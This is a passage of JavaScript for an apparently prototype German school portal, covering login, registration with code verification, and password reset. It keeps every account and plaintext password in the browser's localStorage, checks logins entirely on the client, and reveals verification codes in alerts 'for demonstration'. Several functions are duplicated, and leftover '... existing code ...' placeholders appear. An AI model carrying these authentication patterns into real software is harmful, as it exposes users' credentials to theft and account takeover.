                school: school,
                contact: contact,
                password: password,
                verificationCode: verificationCode
            };
            
            localStorage.setItem('pendingUser', JSON.stringify(pendingUser));
            
            // Anzeigen des Verifikationsdialogs
            showVerificationDialog(verificationCode, contact);
        }
        
        // Video-Fehlerbehandlung hinzufügen
        document.addEventListener('DOMContentLoaded', function() {
            const video = document.getElementById('background-video');
            
            // Überprüfen, ob das Video geladen werden kann
            video.addEventListener('error', function(e) {
                console.error('Video-Fehler:', e);
                // Fallback-Hintergrund bei Fehler
                document.querySelector('.login-page').style.background = 'linear-gradient(to bottom right, var(--primary-500), var(--secondary-500))';
            });
            
            // Versuchen, das Video zu laden
            video.load();
        });
        
        // Direkte Funktionalität für die Tabs
        window.addEventListener('load', function() {
            // Tab-Elemente
            const loginTab = document.getElementById('login-tab');
            const registerTab = document.getElementById('register-tab');
            const loginForm = document.getElementById('login-form');
            const registerForm = document.getElementById('register-form');
            
            console.log('Tabs geladen:', loginTab, registerTab);
            console.log('Formulare geladen:', loginForm, registerForm);
            
            // Event-Listener für Login-Tab
            if (loginTab) {
                loginTab.addEventListener('click', function(e) {
                    console.log('Login-Tab geklickt');
                    e.preventDefault();
                    loginTab.classList.add('active');
                    registerTab.classList.remove('active');
                    loginForm.style.display = 'block';
                    registerForm.style.display = 'none';
                });
            }
            
            // Event-Listener für Register-Tab
            if (registerTab) {
                registerTab.addEventListener('click', function(e) {
                    console.log('Register-Tab geklickt');
                    e.preventDefault();
                    registerTab.classList.add('active');
                    loginTab.classList.remove('active');
                    registerForm.style.display = 'block';
                    loginForm.style.display = 'none';
                });
                
                // Füge zusätzlich einen direkten onClick-Handler hinzu
                registerTab.onclick = function() {
                    console.log('Register-Tab onClick ausgelöst');
                    registerTab.classList.add('active');
                    loginTab.classList.remove('active');
                    registerForm.style.display = 'block';
                    loginForm.style.display = 'none';
                };
            }
        });
        
        document.addEventListener('DOMContentLoaded', function() {
            const loginPage = document.getElementById('login-page');
            const dashboard = document.getElementById('dashboard');
            const loginForm = document.getElementById('login-form');
            const registerForm = document.getElementById('register-form');
            const menuButton = document.getElementById('menu-button');
            const navigation = document.getElementById('navigation');
            const messageModal = document.getElementById('message-modal');
            const newMessageBtn = document.getElementById('new-message-btn');
            const modalClose = document.getElementById('modal-close');
            const cancelMessage = document.getElementById('cancel-message');
            const sendMessage = document.getElementById('send-message');
            const recipients = document.querySelectorAll('.recipient');
            const notificationBtn = document.getElementById('notification-btn');
            const notificationsDropdown = document.getElementById('notifications-dropdown');
            const markAllRead = document.getElementById('mark-all-read');
            const rememberMeCheckbox = document.getElementById('remember-me');
            const profileButton = document.getElementById('profile-button');
            const profileDropdown = document.getElementById('profile-dropdown');
            const profileName = document.getElementById('profile-name');
            const profileImage = document.getElementById('profile-image');
            const logoutButton = document.getElementById('logout-button');
            const currentPageTitle = document.getElementById('current-page-title');
            
            // Login/Register Tabs
            const loginTab = document.getElementById('login-tab');
            const registerTab = document.getElementById('register-tab');
            
            // Überprüfen, ob die DOM-Elemente existieren
            console.log('Login-Tab:', loginTab);
            console.log('Register-Tab:', registerTab);
            console.log('Login-Form:', loginForm);
            console.log('Register-Form:', registerForm);
            
            // Seiten-Container
            const dashboardContent = document.getElementById('dashboard-content');
            const stundenplanPage = document.getElementById('stundenplan-page');
            const notenPage = document.getElementById('noten-page');
            const nachrichtenPage = document.getElementById('nachrichten-page');
            
            // Navigation Links
            const navLinks = document.querySelectorAll('.nav-link');
            
            let isLoggedIn = false;
            
            // Prüfen, ob der Benutzer bereits angemeldet ist
            checkRememberedLogin();
            
            const emailOption = document.getElementById('email-option');
            const phoneOption = document.getElementById('phone-option');
            const emailInputContainer = document.getElementById('email-input-container');
            const phoneInputContainer = document.getElementById('phone-input-container');
            const registerSchool = document.getElementById('register-school');
            const schoolDropdown = document.getElementById('school-dropdown');
            const schoolItems = document.querySelectorAll('.school-item');
            
            // Initialisiere registeredUsers im localStorage, falls noch nicht vorhanden
            if (!localStorage.getItem('registeredUsers')) {
                localStorage.setItem('registeredUsers', JSON.stringify([]));
            }
            
            // Deutsche Schulen laden
            loadSchoolDropdown();
            
            // Navigation zwischen den Seiten
            navLinks.forEach(link => {
                link.addEventListener('click', function(event) {
                    event.preventDefault();
                    
                    // Aktiven Link setzen
                    navLinks.forEach(l => l.classList.remove('active'));
                    this.classList.add('active');
                    
                    // Seiten-Container anzeigen/ausblenden basierend auf dem Link-Text
                    const linkText = this.textContent.trim();
                    
                    // Alle Seiten ausblenden
                    dashboardContent.classList.remove('active');
                    if (stundenplanPage) stundenplanPage.classList.remove('active');
                    if (notenPage) notenPage.classList.remove('active');
                    if (nachrichtenPage) nachrichtenPage.classList.remove('active');
                    
                    // Entsprechende Seite anzeigen
                    if (linkText === 'Dashboard') {
                        dashboardContent.classList.add('active');
                        currentPageTitle.textContent = 'Dashboard';
                    } else if (linkText === 'Stundenplan') {
                        stundenplanPage.classList.add('active');
                        currentPageTitle.textContent = 'Stundenplan';
                    } else if (linkText === 'Noten') {
                        notenPage.classList.add('active');
                        currentPageTitle.textContent = 'Noten';
                    } else if (linkText === 'Nachrichten') {
                        nachrichtenPage.classList.add('active');
                        currentPageTitle.textContent = 'Nachrichten';
                    }
                    
                    // Auf mobilen Geräten das Menü schließen
                    if (window.innerWidth < 768) {
                        navigation.classList.remove('open');
                    }
                });
            });
            
            // "Alle anzeigen" Links
            document.querySelectorAll('.view-all').forEach(link => {
                link.addEventListener('click', function(event) {
                    event.preventDefault();
                    
                    const page = this.getAttribute('data-page');
                    
                    // Alle Seiten ausblenden
                    dashboardContent.classList.remove('active');
                    if (stundenplanPage) stundenplanPage.classList.remove('active');
                    if (notenPage) notenPage.classList.remove('active');
                    if (nachrichtenPage) nachrichtenPage.classList.remove('active');
                    
                    // Navigation-Links aktualisieren
                    navLinks.forEach(link => {
                        link.classList.remove('active');
                        if (link.textContent.trim().toLowerCase() === page) {
                            link.classList.add('active');
                        }
                    });
                    
                    // Entsprechende Seite anzeigen
                    if (page === 'stundenplan') {
                        stundenplanPage.classList.add('active');
                        currentPageTitle.textContent = 'Stundenplan';
                    } else if (page === 'noten') {
                        notenPage.classList.add('active');
                        currentPageTitle.textContent = 'Noten';
                    } else if (page === 'nachrichten') {
                        nachrichtenPage.classList.add('active');
                        currentPageTitle.textContent = 'Nachrichten';
                    }
                });
            });
            
            // Tab-Wechsel zwischen Login und Registrierung
            if (loginTab && registerTab) {
                // Diese Event-Listener werden jetzt in window.onload gesetzt
            }
            
            // Login-Formular Event-Listener
            if (loginForm) {
            loginForm.addEventListener('submit', function(event) {
                event.preventDefault();
                    console.log('Login-Formular abgesendet');
                    
                const username = document.getElementById('username').value;
                const password = document.getElementById('password').value;
                
                // Überprüfen, ob die Felder ausgefüllt sind
                if (!username || !password) {
                    alert('Bitte Benutzername und Passwort eingeben.');
                    return;
                }
                
                // Überprüfen, ob der Benutzer registriert ist
                const registeredUsers = JSON.parse(localStorage.getItem('registeredUsers') || '[]');
                const user = registeredUsers.find(u => u.username === username && u.password === password);
                
                if (user) {
                    // Login erfolgreich
                    loginSuccess(username);
                } else {
                    // Login fehlgeschlagen
                    alert('Benutzername oder Passwort falsch!');
                }
            });
            }
            
            // Register-Formular Event-Listener
            if (registerForm) {
            registerForm.addEventListener('submit', function(event) {
                event.preventDefault();
                    console.log('Register-Formular abgesendet');
                
                const fullname = document.getElementById('register-fullname').value;
                const username = document.getElementById('register-username').value;
                const school = document.getElementById('register-school').value;
                const password = document.getElementById('register-password').value;
                const confirmPassword = document.getElementById('register-confirm-password').value;
                
                // Kontaktinformationen je nach gewählter Option
                let contact = '';
                if (emailOption.classList.contains('active')) {
                    contact = document.getElementById('register-email').value;
                } else {
                    contact = document.getElementById('register-phone').value;
                }
                
                // Überprüfung der Passwörter
                if (password !== confirmPassword) {
                    alert('Die Passwörter stimmen nicht überein.');
                    return;
                }
                
                // Überprüfen, ob der Benutzername bereits existiert
                const registeredUsers = JSON.parse(localStorage.getItem('registeredUsers') || '[]');
                if (registeredUsers.some(u => u.username === username)) {
                    alert('Dieser Benutzername existiert bereits. Bitte wähle einen anderen.');
                    return;
                }
                
                // 6-stelligen Verifizierungscode generieren
                const verificationCode = generateRandomCode(6);
                
                // Daten für die Verifizierung zwischenspeichern
                const pendingUser = {
                    fullname: fullname,
                    username: username,
                    school: school,
                    contact: contact,
                    password: password,
                    verificationCode: verificationCode
                };
                
                localStorage.setItem('pendingUser', JSON.stringify(pendingUser));
                
                // Anzeigen des Verifikationsdialogs
                showVerificationDialog(verificationCode, contact);
            });
            }
            
            // Funktion zum Generieren eines zufälligen Codes
            function generateRandomCode(length) {
                const digits = '0123456789';
                let code = '';
                for (let i = 0; i < length; i++) {
                    code += digits.charAt(Math.floor(Math.random() * digits.length));
                }
                return code;
            }
            
            // Funktion zum Anzeigen des Verifikationsdialogs
            function showVerificationDialog(code, userEmail) {
                // Dummy-Email-Info anzeigen
                alert('Ein Verifizierungscode wurde an ' + userEmail + ' gesendet.\n\n' +
                      'In einer echten Anwendung würde eine E-Mail von unternehmenzyrogmbh@gmail.com gesendet werden.\n\n' +
                      'Zu Demonstrationszwecken: Dein Code ist ' + code);
                
                // Verifikationsdialog erstellen
                const verificationDialog = document.createElement('div');
                verificationDialog.className = 'modal open';
                verificationDialog.id = 'verification-modal';
                
                verificationDialog.innerHTML = `
                    <div class="modal-content" style="max-width: 400px;">
                        <div class="modal-header">
                            <h2 class="modal-title">E-Mail verifizieren</h2>
                            <button class="modal-close" id="verification-close">
                                <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                                    <line x1="18" y1="6" x2="6" y2="18"></line>
                                    <line x1="6" y1="6" x2="18" y2="18"></line>
                                </svg>
                            </button>
                        </div>
                        <div class="modal-body">
                            <p>Ein 6-stelliger Code wurde an deine E-Mail-Adresse gesendet. Bitte gib den Code hier ein, um deine Registrierung abzuschließen.</p>
                            <div class="form-group">
                                <label for="verification-code">Verifizierungscode</label>
                                <input id="verification-code" type="text" placeholder="6-stelligen Code eingeben" maxlength="6" required>
                            </div>
                        </div>
                        <div class="modal-footer"> 
                            <button class="btn btn-secondary" id="verification-cancel">Abbrechen</button>
                            <button class="btn btn-primary" id="verification-submit">Bestätigen</button>
                        </div>
                    </div>
                `;
                
                document.body.appendChild(verificationDialog);
                
                // Event-Listener für Schließen des Dialogs
                document.getElementById('verification-close').addEventListener('click', function() {
                    document.body.removeChild(verificationDialog);
                });
                
                document.getElementById('verification-cancel').addEventListener('click', function() {
                    document.body.removeChild(verificationDialog);
                });
                
                // Event-Listener für Bestätigen des Codes
                document.getElementById('verification-submit').addEventListener('click', function() {
                    const enteredCode = document.getElementById('verification-code').value;
                    const pendingUser = JSON.parse(localStorage.getItem('pendingUser') || '{}');
                    
                    if (enteredCode === pendingUser.verificationCode) {
                        // Code ist korrekt, Benutzer registrieren
                        const registeredUsers = JSON.parse(localStorage.getItem('registeredUsers') || '[]');
                        
                        // Verifikationscode entfernen bevor Benutzer gespeichert wird
                        delete pendingUser.verificationCode;
                        
                        // Benutzer zur Liste hinzufügen
                        registeredUsers.push(pendingUser);
                        localStorage.setItem('registeredUsers', JSON.stringify(registeredUsers));
                        
                        // Aktiven Benutzer speichern
                        localStorage.setItem('zyroUser', JSON.stringify(pendingUser));
                        
                        // Dialog schließen
                        document.body.removeChild(verificationDialog);
                        
                        // Erfolgsmeldung anzeigen und einloggen
                        alert('Registrierung erfolgreich abgeschlossen!');
                        loginSuccess(pendingUser.username);
                    } else {
                        // Falscher Code
                        alert('Der eingegebene Code ist nicht korrekt. Bitte versuche es erneut.');
                    }
                });
            }
            
            function loginSuccess(username) {
                // Benutzerdaten aus registeredUsers holen
                const registeredUsers = JSON.parse(localStorage.getItem('registeredUsers') || '[]');
                const user = registeredUsers.find(u => u.username === username);
                
                if (user) {
                    // Benutzerdaten im localStorage speichern
                    localStorage.setItem('zyroUser', JSON.stringify(user));
                    
                    // "Angemeldet bleiben" Option speichern
                if (rememberMeCheckbox && rememberMeCheckbox.checked) {
                    localStorage.setItem('zyroLoggedIn', 'true');
                }
                
                // Dashboard anzeigen und Login-Seite ausblenden
                loginPage.style.display = 'none';
                dashboard.style.display = 'block';
                
                // Benutzernamen im Profil anzeigen
                if (profileName) {
                        profileName.textContent = user.fullname || username;
                }
                
                // Benutzerinitiale im Profilbild anzeigen
                if (profileImage) {
                        const initial = (user.fullname || username).charAt(0).toUpperCase();
                    profileImage.textContent = initial;
                }
                
                isLoggedIn = true;
                }
            }
            
            function checkRememberedLogin() {
                const rememberedLogin = localStorage.getItem('zyroLoggedIn');
                const userData = JSON.parse(localStorage.getItem('zyroUser') || '{}');
                
                if (rememberedLogin === 'true' && userData.username) {
                    loginSuccess(userData.username);
                }
            }
            
            emailOption.addEventListener('click', function() {
                emailOption.classList.add('active');
                phoneOption.classList.remove('active');
                emailInputContainer.style.display = 'block';
                phoneInputContainer.style.display = 'none';
                document.getElementById('register-email').setAttribute('required', '');
                document.getElementById('register-phone').removeAttribute('required');
            });
            
            phoneOption.addEventListener('click', function() {
                phoneOption.classList.add('active');
                emailOption.classList.remove('active');
                phoneInputContainer.style.display = 'block';
                emailInputContainer.style.display = 'none';
                document.getElementById('register-phone').setAttribute('required', '');
                document.getElementById('register-email').removeAttribute('required');
            });
            
            // Schulauswahl
            registerSchool.addEventListener('focus', function() {
                schoolDropdown.classList.add('open');
            });
            
            registerSchool.addEventListener('input', function() {
                const searchText = this.value.toLowerCase();
                
                document.querySelectorAll('.school-item').forEach(item => {
                    const schoolName = item.querySelector('.school-name').textContent.toLowerCase();
                    const schoolAddress = item.querySelector('.school-address').textContent.toLowerCase();
                    
                    if (schoolName.includes(searchText) || schoolAddress.includes(searchText)) {
                        item.style.display = 'block';
                    } else {
                        item.style.display = 'none';
                    }
                });
                
                schoolDropdown.classList.add('open');
            });
            
            document.addEventListener('click', function(event) {
                if (!registerSchool.contains(event.target) && !schoolDropdown.contains(event.target)) {
                    schoolDropdown.classList.remove('open');
                }
            });
            
            document.querySelectorAll('.school-item').forEach(item => {
                item.addEventListener('click', function() {
                    const schoolName = this.querySelector('.school-name').textContent;
                    registerSchool.value = schoolName;
                    schoolDropdown.classList.remove('open');
                });
            });
            
            // Logout-Funktion
            if (logoutButton) {
                logoutButton.addEventListener('click', function() {
                    // Nur die Login-Session entfernen, aber registrierte Benutzer behalten
                    localStorage.removeItem('zyroLoggedIn');
                    localStorage.removeItem('zyroUser');
                    
                    loginPage.style.display = 'flex';
                    dashboard.style.display = 'none';
                    isLoggedIn = false;
                });
            }
            
            // Menü für mobile Ansicht
            if (menuButton) {
                menuButton.addEventListener('click', function() {
                    navigation.classList.toggle('open');
                });
            }
            
            // Nachrichten-Modal öffnen/schließen
            if (newMessageBtn) {
                newMessageBtn.addEventListener('click', function() {
                    messageModal.classList.add('open');
                });
            }
            
            if (modalClose) {
                modalClose.addEventListener('click', function() {
                    messageModal.classList.remove('open');
                });
            }
            
            if (cancelMessage) {
                cancelMessage.addEventListener('click', function() {
                    messageModal.classList.remove('open');
                });
            }
            
            // Empfänger auswählen
            recipients.forEach(recipient => {
                recipient.addEventListener('click', function() {
                    recipients.forEach(r => r.classList.remove('selected'));
                    this.classList.add('selected');
                });
            });
            
            // Benachrichtigungen Dropdown
            if (notificationBtn) {
                notificationBtn.addEventListener('click', function(event) {
                    event.stopPropagation();
                    notificationsDropdown.classList.toggle('open');
                    profileDropdown.classList.remove('open');
                });
            }
            
            // Profil Dropdown
            if (profileButton) {
                profileButton.addEventListener('click', function(event) {
                    event.stopPropagation();
                    profileDropdown.classList.toggle('open');
                    notificationsDropdown.classList.remove('open');
                });
            }
            
            // Dropdowns schließen, wenn außerhalb geklickt wird
            document.addEventListener('click', function() {
                notificationsDropdown.classList.remove('open');
                profileDropdown.classList.remove('open');
            });
            
            // Alle Benachrichtigungen als gelesen markieren
            if (markAllRead) {
                markAllRead.addEventListener('click', function() {
                    document.querySelectorAll('.notification-unread').forEach(notification => {
                        notification.classList.remove('notification-unread');
                    });
                });
            }
        });

        // Beispiel für deutsche Schulen (wird später durch schools.js ersetzt)
        const germanSchools = [
            { id: 1, name: "Gymnasium am Stadtpark", address: "Parkstraße 15, 10115 Berlin" },
            { id: 2, name: "Marie-Curie-Oberschule", address: "Hauptstraße 42, 20095 Hamburg" },
            { id: 3, name: "Albert-Einstein-Gymnasium", address: "Schillerstraße 23, 80336 München" },
            { id: 4, name: "Friedrich-Schiller-Realschule", address: "Goetheweg 8, 50667 Köln" },
            { id: 5, name: "Humboldt-Gesamtschule", address: "Lessingplatz 3, 60313 Frankfurt" },
            { id: 6, name: "Goethe-Gymnasium", address: "Schillerstraße 45, 70173 Stuttgart" },
            { id: 7, name: "Lessing-Realschule", address: "Hauptstraße 78, 40213 Düsseldorf" },
            { id: 8, name: "Heinrich-Heine-Gesamtschule", address: "Schulstraße 12, 30159 Hannover" },
            { id: 9, name: "Schiller-Gymnasium", address: "Goetheallee 33, 01309 Dresden" },
            { id: 10, name: "Kant-Oberschule", address: "Philosophenweg 22, 04103 Leipzig" }
        ];

        function loadSchoolDropdown() {
            const schoolDropdown = document.getElementById('school-dropdown');
            
            // Bestehende Schulen löschen
            schoolDropdown.innerHTML = '';
            
            // Schulen zum Dropdown hinzufügen
            germanSchools.forEach(school => {
                const schoolItem = document.createElement('div');
                schoolItem.className = 'school-item';
                schoolItem.dataset.id = school.id;
                
                const schoolName = document.createElement('div');
                schoolName.className = 'school-name';
                schoolName.textContent = school.name;
                
                const schoolAddress = document.createElement('div');
                schoolAddress.className = 'school-address';
                schoolAddress.textContent = school.address;
                
                schoolItem.appendChild(schoolName);
                schoolItem.appendChild(schoolAddress);
                schoolDropdown.appendChild(schoolItem);
                
                // Event-Listener für Schulauswahl
                schoolItem.addEventListener('click', function() {
                    document.getElementById('register-school').value = school.name;
                    schoolDropdown.classList.remove('open');
                });
            });
        }
        
        // Passwort vergessen Funktionalität
        document.addEventListener('DOMContentLoaded', function() {
            // ... existing code ...
            
            // Passwort vergessen Link
            const forgotPasswordLink = document.querySelector('.forgot-password');
            const forgotPasswordModal = document.getElementById('forgot-password-modal');
            const forgotPasswordClose = document.getElementById('forgot-password-close');
            const forgotCancelBtn = document.getElementById('forgot-cancel');
            const forgotNextBtn = document.getElementById('forgot-next');
            
            // Aktuelle Schritte im Passwort-Zurücksetzen-Prozess
            let forgotStep = 1;
            let forgotEmail = '';
            let forgotCode = '';
            
            // Passwort vergessen Modal öffnen
            if (forgotPasswordLink) {
                forgotPasswordLink.addEventListener('click', function(e) {
                    e.preventDefault();
                    forgotPasswordModal.classList.add('open');
                    forgotStep = 1;
                    showForgotStep(1);
                });
            }
            
            // Modal schließen
            if (forgotPasswordClose) {
                forgotPasswordClose.addEventListener('click', function() {
                    forgotPasswordModal.classList.remove('open');
                    resetForgotForm();
                });
            }
            
            // Abbrechen-Button
            if (forgotCancelBtn) {
                forgotCancelBtn.addEventListener('click', function() {
                    forgotPasswordModal.classList.remove('open');
                    resetForgotForm();
                });
            }
            
            // Weiter-Button
            if (forgotNextBtn) {
                forgotNextBtn.addEventListener('click', function() {
                    processForgotStep();
                });
            }
            
            // Funktion zum Anzeigen des aktuellen Schritts
            function showForgotStep(step) {
                document.getElementById('forgot-step-1').style.display = 'none';
                document.getElementById('forgot-step-2').style.display = 'none';
                document.getElementById('forgot-step-3').style.display = 'none';
                
                document.getElementById('forgot-step-' + step).style.display = 'block';
                
                // Button-Text anpassen
                if (step === 3) {
                    forgotNextBtn.textContent = 'Passwort ändern';
                } else {
                    forgotNextBtn.textContent = 'Weiter';
                }
            }
            
            // Funktion zum Verarbeiten des aktuellen Schritts
            function processForgotStep() {
                const forgotStep = parseInt(document.querySelector('#forgot-password-modal [id^="forgot-step-"]:not([style*="display: none"])').id.split('-')[2]);
                
                if (forgotStep === 1) {
                    // E-Mail validieren
                    const forgotEmail = document.getElementById('forgot-email').value;
                    if (!forgotEmail || !forgotEmail.includes('@')) {
                        alert('Bitte gib eine gültige E-Mail-Adresse ein.');
                        return;
                    }
                    
                    // Prüfen, ob die E-Mail bei einem registrierten Benutzer existiert
                    const registeredUsers = JSON.parse(localStorage.getItem('registeredUsers') || '[]');
                    const user = registeredUsers.find(u => u.contact === forgotEmail);
                    
                    if (!user) {
                        alert('Diese E-Mail-Adresse ist nicht registriert.');
                        return;
                    }
                    
                    // Speichere die E-Mail für spätere Schritte
                    localStorage.setItem('forgotEmail', forgotEmail);
                    
                    // Verifizierungscode generieren und speichern
                    const forgotCode = generateRandomCode(6);
                    localStorage.setItem('forgotCode', forgotCode);
                    
                    // In einer echten Anwendung würde hier eine E-Mail gesendet werden
                    alert('Ein Verifizierungscode wurde an ' + forgotEmail + ' gesendet.\n\n' +
                          'In einer echten Anwendung würde eine E-Mail gesendet werden.\n\n' +
                          'Zu Demonstrationszwecken: Dein Code ist ' + forgotCode);
                    
                    // Zum nächsten Schritt
                    showForgotStep(2);
                } 
                else if (forgotStep === 2) {
                    // Code validieren
                    const enteredCode = document.getElementById('forgot-code').value;
                    const savedCode = localStorage.getItem('forgotCode');
                    
                    if (!enteredCode || enteredCode.length !== 6) {
                        alert('Bitte gib den 6-stelligen Code ein.');
                        return;
                    }
                    
                    if (enteredCode !== savedCode) {
                        alert('Der eingegebene Code ist nicht korrekt. Bitte versuche es erneut.');
                        return;
                    }
                    
                    // Zum nächsten Schritt
                    showForgotStep(3);
                } 
                else if (forgotStep === 3) {
                    // Neue Passwörter validieren
                    const newPassword = document.getElementById('new-password').value;
                    const confirmNewPassword = document.getElementById('confirm-new-password').value;
                    const forgotEmail = localStorage.getItem('forgotEmail');
                    
                    if (!newPassword) {
                        alert('Bitte gib ein neues Passwort ein.');
                        return;
                    }
                    
                    if (newPassword !== confirmNewPassword) {
                        alert('Die Passwörter stimmen nicht überein.');
                        return;
                    }
                    
                    // Passwort in localStorage aktualisieren
                    const registeredUsers = JSON.parse(localStorage.getItem('registeredUsers') || '[]');
                    const userIndex = registeredUsers.findIndex(u => u.contact === forgotEmail);
                    
                    if (userIndex !== -1) {
                        registeredUsers[userIndex].password = newPassword;
                        localStorage.setItem('registeredUsers', JSON.stringify(registeredUsers));
                        
                        alert('Dein Passwort wurde erfolgreich geändert. Du kannst dich jetzt mit deinem neuen Passwort anmelden.');
                        
                        // Modal schließen und Formular zurücksetzen
                        const modal = document.getElementById('forgot-password-modal');
                        modal.classList.remove('open');
                        resetForgotForm();
                        
                        // Temporäre Daten löschen
                        localStorage.removeItem('forgotEmail');
                        localStorage.removeItem('forgotCode');
                    }
                }
            }
            
            // Formular zurücksetzen
            function resetForgotForm() {
                document.getElementById('forgot-email').value = '';
                document.getElementById('forgot-code').value = '';
                document.getElementById('new-password').value = '';
                document.getElementById('confirm-new-password').value = '';
            }
            
            // ... existing code ...
        });
        
        // ... existing code ...

        // Globale Variablen für den Passwort-Zurücksetzen-Prozess
        let forgotCurrentStep = 1;

        // Funktion zum Öffnen des Passwort-vergessen-Modals
        function openForgotPasswordModal() {
            console.log("Öffne Passwort-vergessen-Modal");
            const modal = document.getElementById('forgot-password-modal');
            if (modal) {
                modal.style.display = "flex";
                modal.classList.add('open');
                
                // Zurücksetzen auf Schritt 1
                document.getElementById('forgot-step-1').style.display = 'block';
                document.getElementById('forgot-step-2').style.display = 'none';
                document.getElementById('forgot-step-3').style.display = 'none';
                
                // Button-Text zurücksetzen
                document.getElementById('forgot-next').textContent = 'Weiter';
            }
        }

        // Funktion zum Anzeigen des aktuellen Schritts im Passwort-vergessen-Prozess
        function showForgotStep(step) {
            document.getElementById('forgot-step-1').style.display = 'none';
            document.getElementById('forgot-step-2').style.display = 'none';
            document.getElementById('forgot-step-3').style.display = 'none';
            
            document.getElementById('forgot-step-' + step).style.display = 'block';
            forgotCurrentStep = step;
            
            // Button-Text anpassen
            const nextBtn = document.getElementById('forgot-next');
            if (nextBtn) {
                if (step === 3) {
                    nextBtn.textContent = 'Passwort ändern';
                } else {
                    nextBtn.textContent = 'Weiter';
                }
            }
        }

        // Funktion zum Verarbeiten des aktuellen Schritts
        function processForgotStep() {
            if (forgotCurrentStep === 1) {
                // E-Mail validieren
                const forgotEmail = document.getElementById('forgot-email').value;
                if (!forgotEmail || !forgotEmail.includes('@')) {
                    alert('Bitte gib eine gültige E-Mail-Adresse ein.');
                    return;
                }
                
                // Prüfen, ob die E-Mail bei einem registrierten Benutzer existiert
                const registeredUsers = JSON.parse(localStorage.getItem('registeredUsers') || '[]');
                const user = registeredUsers.find(u => u.contact === forgotEmail);
                
                if (!user) {
                    alert('Diese E-Mail-Adresse ist nicht registriert.');
                    return;
                }
                
                // Speichere die E-Mail für spätere Schritte
                localStorage.setItem('forgotEmail', forgotEmail);
                
                // Verifizierungscode generieren und speichern
                const forgotCode = generateRandomCode(6);
                localStorage.setItem('forgotCode', forgotCode);
                
                // In einer echten Anwendung würde hier eine E-Mail gesendet werden
                alert('Ein Verifizierungscode wurde an ' + forgotEmail + ' gesendet.\n\n' +
                      'In einer echten Anwendung würde eine E-Mail gesendet werden.\n\n' +
                      'Zu Demonstrationszwecken: Dein Code ist ' + forgotCode);
                
                // Zum nächsten Schritt
                showForgotStep(2);
            } 
            else if (forgotCurrentStep === 2) {
                // Code validieren
                const enteredCode = document.getElementById('forgot-code').value;
                const savedCode = localStorage.getItem('forgotCode');
                
                if (!enteredCode || enteredCode.length !== 6) {
                    alert('Bitte gib den 6-stelligen Code ein.');
                    return;
                }
                
                if (enteredCode !== savedCode) {
                    alert('Der eingegebene Code ist nicht korrekt. Bitte versuche es erneut.');
                    return;
                }
                
                // Zum nächsten Schritt
                showForgotStep(3);
            } 
            else if (forgotCurrentStep === 3) {
                // Neue Passwörter validieren
                const newPassword = document.getElementById('new-password').value;
                const confirmNewPassword = document.getElementById('confirm-new-password').value;
                const forgotEmail = localStorage.getItem('forgotEmail');
                
                if (!newPassword) {
                    alert('Bitte gib ein neues Passwort ein.');
                    return;
                }
                
                if (newPassword !== confirmNewPassword) {
                    alert('Die Passwörter stimmen nicht überein.');
                    return;
                }
                
                // Passwort in localStorage aktualisieren
                const registeredUsers = JSON.parse(localStorage.getItem('registeredUsers') || '[]');
                const userIndex = registeredUsers.findIndex(u => u.contact === forgotEmail);
                
                if (userIndex !== -1) {
                    registeredUsers[userIndex].password = newPassword;
                    localStorage.setItem('registeredUsers', JSON.stringify(registeredUsers));
                    
                    alert('Dein Passwort wurde erfolgreich geändert. Du kannst dich jetzt mit deinem neuen Passwort anmelden.');
                    
                    // Modal schließen und Formular zurücksetzen
                    const modal = document.getElementById('forgot-password-modal');
                    modal.classList.remove('open');
                    resetForgotForm();
                    
                    // Temporäre Daten löschen
                    localStorage.removeItem('forgotEmail');
                    localStorage.removeItem('forgotCode');
                }
            }
        }

        // Formular zurücksetzen
        function resetForgotForm() {
            document.getElementById('forgot-email').value = '';
            document.getElementById('forgot-code').value = '';
            document.getElementById('new-password').value = '';
            document.getElementById('confirm-new-password').value = '';
            forgotCurrentStep = 1;
        }

        // ... existing code ...

        // Füge einen DOMContentLoaded-Event-Listener hinzu, der speziell für den Passwort-vergessen-Button ist
        document.addEventListener('DOMContentLoaded', function() {
            // Passwort vergessen Button
            const forgotPasswordBtn = document.querySelector('.forgot-password-btn');
            if (forgotPasswordBtn) {
                console.log("Passwort-vergessen-Button gefunden");
                forgotPasswordBtn.addEventListener('click', function() {
                    console.log("Passwort-vergessen-Button geklickt");
                    const modal = document.getElementById('forgot-password-modal');
                    if (modal) {
                        console.log("Modal gefunden, wird geöffnet");
                        modal.style.display = "flex";
                        modal.classList.add('open');
                        
                        // Zurücksetzen auf Schritt 1
                        document.getElementById('forgot-step-1').style.display = 'block';
                        document.getElementById('forgot-step-2').style.display = 'none';
                        document.getElementById('forgot-step-3').style.display = 'none';
                        
                        // Button-Text zurücksetzen
                        const nextBtn = document.getElementById('forgot-next');
                        if (nextBtn) {
                            nextBtn.textContent = 'Weiter';
                        }
                    } else {
                        console.error("Modal nicht gefunden!");
                    }
                });
            } else {
                console.error("Passwort-vergessen-Button nicht gefunden");
            }
        });

        // Direkter Event-Listener für den finalen Registrieren-Button
        document.addEventListener('DOMContentLoaded', function() {
            const finalRegisterButton = document.getElementById('final-register-button');
            if (finalRegisterButton) {
                console.log("Finaler Registrieren-Button gefunden");
                finalRegisterButton.addEventListener('click', function() {
                    console.log("Finaler Registrieren-Button geklickt");
                    
                    // Prüfen, ob die Nutzungsbedingungen akzeptiert wurden
                    const termsCheckbox = document.getElementById('register-terms');
                    if (!termsCheckbox || !termsCheckbox.checked) {
                        alert('Bitte akzeptiere die Nutzungsbedingungen, um fortzufahren.');
                        return;
                    }
                    
                    // Daten aus allen Schritten sammeln
                    const fullname = document.getElementById('register-fullname').value;
                    const username = document.getElementById('register-username').value;
                    const school = document.getElementById('register-school').value;
                    const password = document.getElementById('register-password').value;
                    
                    // Kontaktinformationen je nach gewählter Option
                    let contact = '';
                    if (document.getElementById('email-option').classList.contains('active')) {
                        contact = document.getElementById('register-email').value;
                    } else {
                        contact = document.getElementById('register-phone').value;
                    }
                    
                    // Überprüfen, ob der Benutzername bereits existiert
                    const registeredUsers = JSON.parse(localStorage.getItem('registeredUsers') || '[]');
                    if (registeredUsers.some(u => u.username === username)) {
                        alert('Dieser Benutzername existiert bereits. Bitte wähle einen anderen.');
                        return;
                    }
                    
                    // 6-stelligen Verifizierungscode generieren
                    const verificationCode = generateRandomCode(6);
                    
                    // Daten für die Verifizierung zwischenspeichern
                    const pendingUser = {
                        fullname: fullname,
                        username: username,
                        school: school,
                        contact: contact,
                        password: password,
